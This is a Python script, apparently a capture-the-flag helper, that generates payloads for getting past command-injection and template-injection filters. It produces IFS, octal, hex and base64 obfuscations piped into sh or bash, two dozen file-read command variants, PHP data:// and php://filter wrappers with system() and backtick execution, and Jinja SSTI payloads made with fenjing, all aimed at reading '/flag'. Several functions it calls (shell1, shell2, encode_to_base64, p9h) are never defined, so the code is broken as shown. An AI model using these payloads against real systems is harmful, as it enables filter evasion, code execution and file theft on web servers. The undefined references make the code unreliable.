import base64
import binascii
import socket
import struct
import urllib.parse
import requests
from fenjing import exec_cmd_payload

def shellspace(shell):
    shell1 = shell.replace(' ', '$IFS', 1)
    shell2 = shell.replace(' ', '${IFS}', 1)
    shell3 = shell.replace(' ', '<', 1)
    shell4 = shell.replace(' ', '%20')
    shell5 = shell.replace(' ', '%09')
    combined_shell = '\n'.join([shell1, shell2, shell3, shell4, shell5])
    return combined_shell

def str_to_oct(s):
    return ''.join([f"\\{oct(ord(c))[2:]}" for c in s])

def str_to_hex(s):
    return ''.join([f"\\x{hex(ord(c))[2:]}" for c in s])

def shelloct_hex(shell):
    parts = shell.split(' ')
    octal_parts = ["".join([f"\\{oct(ord(c))[2:]}" for c in part]) for part in parts]
    command1 = " ".join([f"$'{octal_part}'" for octal_part in octal_parts])
    oct_shell = str_to_oct(shell)
    hex_shell = str_to_hex(shell)
    command2 = f'$(printf "{oct_shell}")'
    command3 = f'$(printf "{hex_shell}")'
    combined_commands = '\n'.join([command1, command2, command3])
    return combined_commands

def shellbase64(shell):
    base64data = base64.b64encode(shell.encode('utf-8')).decode('utf-8')
    command1 = "`echo " + base64data + " | base64 -d`"
    command2 = "echo " + base64data + " | base64 -d|sh"
    command3 = "echo " + base64data + " | base64 -d|bash"
    combined_commands = '\n'.join([command1, command2, command3])
    return combined_commands

def shellhex(shell):
    hexdata = binascii.hexlify(shell.encode('utf-8')).decode('utf-8')
    hexdata2 = hexdata.upper()
    command1 = "`echo " + hexdata + " | xxd -r -p`"
    command2 = "echo " + hexdata + " | xxd -r -p | bash"
    command3 = "echo " + hexdata + " | xxd -r -p | sh"
    command4 = "`echo " + hexdata2 + " | xxd -r -p`"
    command5 = "echo " + hexdata2 + " | xxd -r -p | bash"
    command6 = "echo " + hexdata2 + " | xxd -r -p | sh"
    combined_commands = '\n'.join([command1, command2, command3, command4, command5, command6])
    return combined_commands

def readfile(shell):
    command1 = f"sort {shell}"
    command2 = f"od -a {shell}"
    command3 = f"nl {shell}"
    command4 = f"tac {shell}"
    command5 = f"more {shell}"
    command6 = f"less {shell}"
    command7 = f"head {shell}"
    command8 = f"tail {shell}"
    command9 = f"tailf {shell}"
    command10 = f"cat {shell}"
    command11 = f"vi {shell}"
    command12 = f"vim {shell}"
    command13 = f"nano {shell}"
    command14 = f"uniq {shell}"
    command15 = f"file {shell}"
    command16 = f"find {shell}"
    command17 = f"cut -d '' -f1 {shell}"
    command18 = f"wget -i {shell}"
    command19 = f"curl file://{shell}"
    command20 = f"sed -n \"p\" {shell}"
    command21 = f"bzless {shell}"
    command22 = f"bzmore {shell}"
    command23 = f"paste {shell}"
    command24 = f"sh {shell} 2>&1"
    combined_commands = '\n'.join([command1, command2, command3, command4, command5, command6, command7, command8, command9, command10, command11, command12, command13, command14, command15, command16, command17, command18, command19, command20, command21, command22, command23, command24])
    return combined_commands

def php_shell(shell):
    command1 = f"${shell};"
    base64shell = encode_to_base64("<?php" + " " + shell + "?>")
    command2 = "include" + " " + f"data://text/plain;base64,{base64shell}"
    command3 = f"data:text/plain,<?php {shell}?> "
    command4 = f"data:text/plain;base64,{base64shell}"
    command5 = f"<?={shell}?>"
    command6 = f"?><?={shell}"
    command7 = f"echo `{shell}`;"
    combined_commands = '\n'.join([command1, command2, command3, command4, command5, command6, command7])
    return combined_commands

def php_readfile(shell):
    command1 = "{cat," + shell + "}"
    command2 = f"php://filter/read=convert.base64-encode/resource={shell}"
    command3 = f"php://filter/resource={shell}"
    command4 = f"php://filter/convert.iconv.UTF-8.UTF-7/resource={shell}"
    command5 = f"file://{shell}"
    command6 = f"compress.zlib://{shell}"
    command7 = f"php://filter/convert.base64-encode/resource={shell}"
    command8 = f"?><?=`cat {shell}`"
    command9 = f"<?= `cat {shell}`?>"
    command10 = f"system('cat {shell}');"
    command11 = f"file_get_contents({shell});"
    command12 = f"readfile({shell});"
    command13 = f"highlight_file({shell});"
    command14 = f"show_source({shell})"
    command15 = f"include({shell})"
    combined_commands = '\n'.join([command1, command2, command3, command4, command5, command6, command7, command8, command9, command10, command11, command12, command13, command14, command15])
    return combined_commands

def re_string(s):
    return ''.join(['[b]' if c.isdigit() else '[^b]' if c.isalpha() else c for c in s])

def set_global_variable(var_name, var_value):
    globals()[var_name] = var_value

def waf(s: str):
    blacklist = globals()['blacklist']
    return all(word not in s for word in blacklist)

def ssti_shell(shell):
    shell_payload, will_print = exec_cmd_payload(waf, shell)
    if not will_print:
        print("无法生成payload")
    print(f"{shell_payload=}")

def python_shell(shell, black_list):
    p9h.BLACK_CHAR = black_list
    runner = p9h.P9H(shell, versbose=0)
    result = runner.visit()
    status, c_result = p9h.color_check(result)
    return result

def ip_to_int(ip_address):
    return struct.unpack('!I', socket.inet_aton(ip_address))[0]

def readfilebata(shell):
    readdata = readfile(shell)
    readdata_list = readdata.split("\n")
    for i in readdata_list:
        print(i)

def readfilepro(shell):
    readdata = readfile(shell)
    readdata_list = readdata.split("\n")
    for i in readdata_list:
        print(i)
        print(shelloct_hex(i))
        print(shellbase64(i))
        print(shellhex(i))
        print(shell1(i))
        print(shell2(i))
        print(shellspace(i))
        print(shellspace(shelloct_hex(i)))
        print(shellspace(shellbase64(i)))
        print(shellspace(shellhex(i)))
        print(shellspace(shell1(i)))
        print(shellspace(shell2(i)))

def shellpro(shell):
    print(shellspace(shell))
    print(shelloct_hex(shell))
    print(shellbase64(shell))
    print(shellhex(shell))
    print(shell1(shell))
    print(shell2(shell))

if __name__ == '__main__':
    shell = "cat /flag"
    blacklist = ['_',"%"]
    set_global_variable('blacklist', blacklist)
    ssti_shell(shell)
